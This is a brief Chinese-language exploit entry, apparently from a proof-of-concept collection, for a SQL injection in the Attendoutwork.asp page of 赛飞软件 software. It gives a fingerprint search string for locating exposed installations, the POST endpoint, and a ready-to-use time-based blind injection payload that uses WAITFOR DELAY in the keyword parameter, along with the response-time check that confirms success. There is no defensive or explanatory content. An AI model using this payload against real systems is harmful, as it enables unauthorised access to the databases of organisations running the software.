# 赛飞软件Attendoutwork存在SQL注入

赛飞软件 ｜ SQL注入 ｜ —
- **指纹**：`body=" 赛飞软件"`
- **请求**：`POST /web/Attendoutwork.asp?action=cousuo HTTP/1.1`

**Payload**
```
Submit=&begindate=01/01/1967&enddate=01/01/1967&keyword=yM7XwSI1');WAITFOR%20DELAY%20'0:0:5'--%20
```
- **响应特征**：200 响应时间>=5s